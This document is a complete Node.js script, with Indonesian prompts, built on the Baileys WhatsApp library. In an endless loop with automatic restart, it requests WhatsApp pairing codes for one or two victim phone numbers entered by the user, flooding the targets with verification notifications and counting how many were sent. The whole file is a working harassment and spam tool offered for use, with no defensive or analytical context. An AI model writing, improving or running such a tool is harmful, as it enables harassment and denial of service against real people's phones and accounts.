const readline = require('readline');
const chalk = require('chalk')
const { exec } = require('child_process');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');

let targetNumber1 = '';
let targetNumber2 = '';
let selectedOption = '';
process.stdout.write('\x1Bc');
const isValidPhoneNumber = (phoneNumber) => {
  return /^\d{10,14}$/.test(phoneNumber);
};

const spamPairingCode = async () => {
  let { state } = await useMultiFileAuthState('KIMS');
  let { version } = await fetchLatestBaileysVersion();

  let sucked = await makeWaSocket({ auth: state, browser: ["Ubuntu", "Chrome", "20.0.04"], version, logger: pino({ level: 'fatal' }) });

  if (selectedOption === '1') {
    process.stdout.write('\x1Bc');
    if (targetNumber1 === '' || !isValidPhoneNumber(targetNumber1)) {
      console.log(chalk.yellow.bold(`Masukan Nomor Target`));
      rl.question('\x1b[1m\x1b[33mContoh 628***\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target) => {
        targetNumber1 = target.replace(/[^0-9]/g, '').trim();
        if (isValidPhoneNumber(targetNumber1)) {
          startSpamming(sucked, targetNumber1);
          process.stdout.write('\x1Bc');
        } else {
          console.log(chalk.white.bold(`\nMasukan Dengan Benar ${chalk.red.bold('!!')}`));
          setTimeout(() => {
          spamPairingCode();
          }, 1500);
        }
      });
    } else {
      startSpamming(sucked, targetNumber1);
    }
  } else if (selectedOption === '2') {
    process.stdout.write('\x1Bc');
    
    if (targetNumber1 === '' || targetNumber2 === '' || !isValidPhoneNumber(targetNumber1) || !isValidPhoneNumber(targetNumber2)) {
        console.log(chalk.yellow.bold(`Masukan Nomor Target\nContoh 628***`));
        rl.question('\x1b[1m\x1b[33mTarget 1\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target1) => {
            targetNumber1 = target1.replace(/[^0-9]/g, '').trim();
            rl.question('\x1b[1m\x1b[33mTarget 2\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target2) => {
                targetNumber2 = target2.replace(/[^0-9]/g, '').trim();
                if (isValidPhoneNumber(targetNumber1) && isValidPhoneNumber(targetNumber2)) {
                    startAlternateSpamming();
                } else {
                    console.log(chalk.white.bold(`\nMasukan Dengan Benar ${chalk.red.bold('!!')}`));
                    setTimeout(() => {
                        spamPairingCode();
                    }, 1500);
                }
            });
        });
    } else {
        startAlternateSpamming();
    }

    function startAlternateSpamming() {
        const initialTarget1 = targetNumber1;
        const initialTarget2 = targetNumber2;

        function alternateSpamming(sucked, target1, target2) {
            startSpamming(sucked, target1, target2);
            const delayDuration = 2000;
            setTimeout(() => {
                startSpamming(sucked, target2, target1);
            }, delayDuration);
        }

        alternateSpamming(sucked, initialTarget1, initialTarget2);
    }
} else {
  process.stdout.write('\x1Bc');
    console.log(chalk.hex('#00BFFF').bold(chalk.bgBlack(`
██╗░░██╗██╗░░░██╗██████╗░
██║░░██║██║░░░██║██╔══██╗
███████║██║░░░██║██████╦╝
██╔══██║██║░░░██║██╔══██╗
██║░░██║╚██████╔╝██████╦╝
╚═╝░░╚═╝░╚═════╝░╚═════╝░
`)));
   rl.question('\x1b[1m\x1b[33mMasukan Jumlah Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37m1/2\x1b[0m\x1b[1m\x1b[31m)\n\x1b[0m\x1b[1m\x1b[37m1\x1b[0m\x1b[1m\x1b[31m) \x1b[1m\x1b[33m1 Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37mTanpa Limit\x1b[0m\x1b[1m\x1b[31m)\n\x1b[0m\x1b[1m\x1b[37m2\x1b[0m\x1b[1m\x1b[31m) \x1b[1m\x1b[33m2 Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37mAda Limit\x1b[0m\x1b[1m\x1b[31m)\x1b[0m\n\n\x1b[1m\x1b[33mPilih\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', (option) => {
      if (option === '1' || option === '2') {
        selectedOption = option;
        spamPairingCode();
      } else {
        console.log(chalk.white.bold(`\nPilih Dengan Benar ${chalk.red.bold('!!')}`));
        setTimeout(() => {
        spamPairingCode();
        }, 1500);
      }
    });
  }
};

const startSpamming = async (sucked, target1, target2) => {
  for (;;) {
    try {
      if (selectedOption === '1') {
        await spamTarget(sucked, target1);
      } else if (selectedOption === '2') {
        await spamTarget(sucked, target1);
        await spamTarget(sucked, target2);
      }
    } catch (error) {
      if (selectedOption === '1') {
        console.log(chalk.yellow.bold(`\n\nSedang Restart, Spam Ulang Aktif...`));
      console.log(chalk.yellow.bold(`===================================\n`));
      }
      await sleep(2000);
      spamPairingCode();
      break;
    }
  }
};

let totalSpamCount = 0;
let lastActiveTime = new Date().getTime();
const countryCode = '62';

const spamTarget = async (sucked, target) => {
  if (!target.startsWith(countryCode)) {
    console.log(chalk.white.bold('\nHarus Awalan Kode Negara'));
    process.exit(1);
  }

  let pairingCodeCount = totalSpamCount;
  for (let i = 0; i < 48; i++) {
    await sleep(1000);

    if ((new Date().getTime() - lastActiveTime) > 60000) {
      console.log(chalk.white.bold('Telah Mencapat Limit, EXIT'));
      process.exit(1);
    }

    let prc = await sucked.requestPairingCode(target);
    pairingCodeCount++;
    totalSpamCount++;
    lastActiveTime = new Date().getTime();

    console.clear();
    console.log(chalk.greenBright.bold(chalk.bgBlack(`
${chalk.yellow.bold('Target')}${chalk.white.bold(':')} ${chalk.hex('#00BFFF').bold(`${target}`)}
${chalk.yellow.bold('Terkirim')}   ${chalk.white.bold(':')} ${chalk.bold.white(`${totalSpamCount}`)}`)));

    if (pairingCodeCount % 48 === 0) {
      let currentTime = new Date().getTime();
      let timeDiff = currentTime - lastActiveTime;

      if (timeDiff > 15000) {
        lastActiveTime = currentTime;

        await sleep(15000);
      }

      if (timeDiff > 15000) {
        break;
      }
    }
  }
};

spamPairingCode();